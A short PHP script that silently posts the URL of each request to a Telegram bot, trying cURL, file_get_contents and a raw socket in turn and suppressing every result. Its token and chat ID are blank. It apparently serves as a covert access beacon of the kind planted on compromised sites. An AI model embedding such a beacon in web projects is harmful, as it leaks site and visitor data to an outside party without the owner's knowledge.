<?php

$botToken = "";
$chatID = "";
$currentURL = "https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
$message = "URL diakses: " . $currentURL;

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = [
    'chat_id' => $chatID,
    'text' => $message,
];

function sendWithCurl($url, $data) {
    if (!function_exists('curl_init')) {
        return false; 
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response !== false;
}


function sendWithFileGetContents($url, $data) {
    if (!ini_get('allow_url_fopen')) {
        return false; 
    }

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    return $response !== false;
}

function sendWithFsockopen($url, $data) {
    $parsedUrl = parse_url($url);
    $host = $parsedUrl['host'];
    $path = $parsedUrl['path'];
    $port = isset($parsedUrl['port']) ? $parsedUrl['port'] : 80;
    $ssl = ($parsedUrl['scheme'] === 'https');

    $data = http_build_query($data);

    $fp = fsockopen(($ssl ? "ssl://" : "") . $host, $ssl ? 443 : $port, $errno, $errstr, 30);

    if (!$fp) {
        return false; 
    }

    $out = "POST $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $out .= "Content-Length: " . strlen($data) . "\r\n";
    $out .= "Connection: Close\r\n\r\n";
    $out .= $data;

    fwrite($fp, $out);
    fclose($fp);

    return true;
}

if (sendWithCurl($url, $data)) {
}
elseif (sendWithFileGetContents($url, $data)) {
}
elseif (sendWithFsockopen($url, $data)) {
}
else {
}

?>